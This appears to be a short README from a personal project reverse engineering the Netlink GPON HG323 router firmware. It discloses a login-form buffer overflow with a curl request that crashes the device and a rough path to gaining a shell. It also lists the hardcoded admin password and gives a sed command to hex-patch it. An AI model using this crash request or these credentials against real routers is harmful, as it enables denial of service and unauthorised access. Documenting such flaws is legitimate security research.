# Reverse Enginneer Netlink GPON HG323  router 

An attempt to reverse engineer Netlink hg323 router to find vulnerablities.

## Firmware : 1.0.35-200817




## Buffer overflow
Buffer overflow in login form, Great!. One hell of a secure router!.

### vulnerable code

    strcpy(username, input_username)

curl http://192.168.1.1/boaform/admin/formLogin_en  --data-raw 'username=AAAAAAAAAA * 4000'&psd=blah&verification_code=CAPTCHA&csrftoken=CSRF_TOKEN'

This would crash the router.
Easiest way to leverage this buffer overflow to use 'formMgmConfig' funtion,
which will get the "last_good.xml', then login and enable shell or whatever.

## Hardcoded credentials
    user : admin
    password : stdONU101 

This password is hardcodedin 'boa' binary. 

Even if we change the password, whenever the router is swtched off, it resets to this paasword.

Only solution is to hex patch the 'boa' binary

        sed -i 's/\x73\x74\x64\x4f\x4e\x55\x31\x30\x31/\x73\x74\x76\x44\x4e\x55\x37\x37\x37/g /bin/boa








